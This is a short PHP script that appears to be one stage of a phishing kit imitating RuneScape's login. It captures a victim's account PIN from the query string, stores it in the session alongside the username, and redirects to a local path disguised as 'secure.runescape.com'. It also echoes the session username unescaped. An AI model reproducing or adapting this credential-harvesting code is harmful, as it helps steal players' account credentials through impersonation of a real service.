<?php
session_start();
      // This session already exists, should already contain data
        echo "User ID:", $_SESSION['username'], "<br />";
    $_SESSION['pin']=$_GET['pin'];
	$pin =  $_GET['pin'];
	header("Location: /runescape/secure.runescape.com/auth=1.php");
 ?>